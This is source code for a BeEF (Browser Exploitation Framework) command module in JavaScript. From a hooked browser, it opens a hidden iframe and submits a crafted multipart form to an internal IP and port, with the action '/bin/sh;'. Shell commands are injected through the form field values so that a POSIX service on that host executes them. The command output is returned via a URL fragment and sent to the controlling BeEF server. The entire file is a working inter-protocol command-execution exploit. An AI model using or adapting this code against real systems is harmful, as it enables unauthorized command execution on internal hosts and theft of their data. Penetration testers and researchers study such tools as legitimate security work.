//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var target_ip = "<%= @ip %>";
	var target_port = "<%= @port %>";
	var cmd = '<%= @cmd %>';
	var timeout = "<%= @command_timeout %>";
	var internal_counter = 0;
	var result_size = "<%= @result_size %>";

	// create iframe
	var iframe = document.createElement("iframe");
	iframe.setAttribute("id","ipc_posix_window_<%= @command_id %>");
	iframe.setAttribute("style", "visibility:hidden;width:1px;height:1px;");
	document.body.appendChild(iframe);

	// send a request
	function send_cmds(ip, port, cmd, size) {

		var action = "http://" + ip + ":" + port + "/index.html?&/bin/sh;";
		var parent = window.location.href;

		// create form
		myform=document.createElement("form");
		myform.setAttribute("name","data");
		myform.setAttribute("method","post");
		myform.setAttribute("enctype","multipart/form-data");
		myform.setAttribute("action",action);
		document.getElementById("ipc_posix_window_<%= @command_id %>").contentWindow.document.body.appendChild(myform); 

		body1="<html><body><div id='ipc_content'>";
        body2="__END_OF_POSIX_IPC<%= @command_id %>__</div><s"+"cript>window.location='"+parent+"#ipc_result='+encodeURI(document.getElementById(\\\"ipc_content\\\").innerHTML);</"+"script></body></html>";

		// post results separator
		myExt = document.createElement("INPUT");
		myExt.setAttribute("id",<%= @command_id %>);
		myExt.setAttribute("name",<%= @command_id %>);
		myExt.setAttribute("value","echo -e HTTP/1.1 200 OK\\\\r;echo -e Content-Type: text/html\\\\r;echo -e Content-Length: "+(body1.length+cmd.length+body2.length+size*1)+"\\\\r;echo -e Keep-Alive: timeout=5,max=100\\\\r;echo -e Connection: keep-alive\\\\r;echo -e \\\\r;echo \""+body1+"\";(" + cmd + ")|head -c "+size+" ; ");
		myform.appendChild(myExt);

		// Adding buffer space for the command result
		end_talkback=" echo -e \""+body2;
		while(--size) end_talkback+=" ";
		end_talkback+="\" \\\\r ;";

		// post js to call home and close connection
		myExt2 = document.createElement("INPUT");
		myExt2.setAttribute("id","endTag");
		myExt2.setAttribute("name","</div>");
		myExt2.setAttribute("value",end_talkback);

		myform.appendChild(myExt2);
		myform.submit();
	}

	// wait <timeout> seconds for iframe url fragment to match #ipc_result=
	function waituntilok() {

		try {
			if (/#ipc_result=/.test(document.getElementById("ipc_posix_window_<%= @command_id %>").contentWindow.location)) {
				ipc_result = document.getElementById("ipc_posix_window_<%= @command_id %>").contentWindow.location.href;
				output = ipc_result.substring(ipc_result.indexOf('#ipc_result=')+12,ipc_result.lastIndexOf('__END_OF_POSIX_IPC<%= @command_id %>__'));
				beef.net.send('<%= @command_url %>', <%= @command_id %>, "result="+decodeURI(output.replace(/%0A/gi, "<br>")).replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/&lt;br&gt;/gi, "<br>"));
				document.body.removeChild(iframe);
				return;
			} else throw("command results haven't been returned yet");
		} catch (e) {
			internal_counter++;
			if (internal_counter > timeout) {
				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Timeout after '+timeout+' seconds');
				document.body.removeChild(iframe);
				return;
			}
			setTimeout(function() {waituntilok()},1000);
		}
	}

	// validate target
	if (!target_port || !target_ip || isNaN(target_port)) {
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=malformed target host or target port');
	} else if (target_port > 65535 || target_port < 0) {
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=invalid target port');

	// send request and wait for reply
	} else {
		send_cmds(target_ip, target_port, cmd,result_size);
		waituntilok();
	}

});

